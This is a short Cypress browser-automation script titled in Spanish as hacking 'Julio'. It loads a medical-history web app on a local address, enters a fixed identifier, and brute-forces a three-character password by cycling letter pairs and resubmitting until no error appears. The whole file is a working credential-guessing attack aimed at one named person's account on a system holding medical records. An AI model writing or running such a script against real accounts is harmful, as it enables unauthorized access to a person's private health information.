describe("HAckear a juliio", () => {
  beforeEach(() => {
    cy.visit("http://192.168.74.89:8080/ExCLI/historiaMedica").wait(2000);
  });
const julioContra = () =>{
    cy.get("#privacy_policy > .modal-dialog > .modal-content > .modal-footer > .btn-success").click();
    cy.get('#claveEst').type('20213tn110')
    
        for (let i = 68; i < 91; i++) {
          for (let j = 65; j < 91; j++) {
              cy.get('[style="position: relative; display: inline-block;"] > .form-control')
              .type(String.fromCharCode(i) + String.fromCharCode(j) + 0);
              cy.get('.input-group-append > .btn').click()
              cy.wait(1000)
              cy.get('.sweet-alert').then(($alert) => {
                if ($alert.text().includes('Error')) {
                  cy.get('.confirm').click()
                  cy.get('[style="position: relative; display: inline-block;"] > .form-control').clear()
                } else {
                  cy.get('.confirm').click()
                }
            })
          }
        }
}

  it("hackear a julio",()=>{
    julioContra()
  })
});
